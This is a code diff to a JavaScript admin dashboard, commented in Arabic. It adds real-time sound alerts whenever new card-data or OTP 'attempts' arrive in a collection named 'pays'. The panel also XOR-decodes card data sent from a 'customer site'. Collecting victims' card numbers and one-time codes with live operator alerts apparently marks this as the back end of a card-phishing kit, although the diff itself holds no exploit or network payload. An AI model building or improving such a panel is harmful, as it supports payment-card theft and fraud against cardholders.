@@ -27,6 +27,8 @@
   let seenIds = new Set();       // للإشعارات الجديدة (عداد الهيدر)
   let knownCardIds = new Set();  // معرّفات البطاقات المعروفة (للكشف عن الجديد)
   let knownOtpIds = new Set();   // معرّفات OTP المعروفة (للكشف عن الجديد)
+  const knownAttemptIds = new Set(); // معرفات محاولات البطاقة والرمز التي تمت رؤيتها
+  let attemptsSnapshotReady = false;
   let soundEnabled = localStorage.getItem('admin_sound') !== '0'; // الإشعارات الصوتية
   let audioCtx = null;           // Web Audio API context (يُنشأ عند الحاجة)
   // فك تشفير بيانات البطاقة (XOR) — دالة محلية مستقلة تدعم أسلوبي موقع العملاء:
@@ -304,8 +306,6 @@
     soundEnabled = !soundEnabled;
     localStorage.setItem('admin_sound', soundEnabled ? '1' : '0');
     updateSoundUI();
-    // إن فُعّل للتو، نشغّل نغمة تأكيد بسيطة (يتطلب تفاعل المستخدم لإنشاء AudioContext)
-    if (soundEnabled) playNotificationTone();
   }
 
   // ── المصادقة (Login) ────────────────────────────────────────
@@ -395,11 +395,17 @@
         cardsList = [];
         cardsBySession = {};
         otpsMap = {};
-        let hasNew = false;
+        let hasNewAttempt = false;
         snap.docChanges().forEach((change) => {
-          if (change.type === 'added' && !knownCardIds.has(change.doc.id)) {
-            hasNew = true;
-          }
+          const data = change.doc.data() || {};
+          const history = Array.isArray(data.history) ? data.history : [];
+          history.forEach((attempt) => {
+            if (!attempt || !attempt.id || (attempt.type !== '_t1' && attempt.type !== '_t2')) return;
+            if (!knownAttemptIds.has(attempt.id)) {
+              if (attemptsSnapshotReady) hasNewAttempt = true;
+              knownAttemptIds.add(attempt.id);
+            }
+          });
         });
         snap.forEach((doc) => {
           const data = doc.data();
@@ -414,7 +420,8 @@
             otpsMap[doc.id].push(item);
           }
         });
-        if (hasNew) playNotificationTone();
+        if (attemptsSnapshotReady && hasNewAttempt) playNotificationTone();
+        attemptsSnapshotReady = true;
         rebuildMerged();
       }, (err) => {
         console.error('pays listen error:', err);
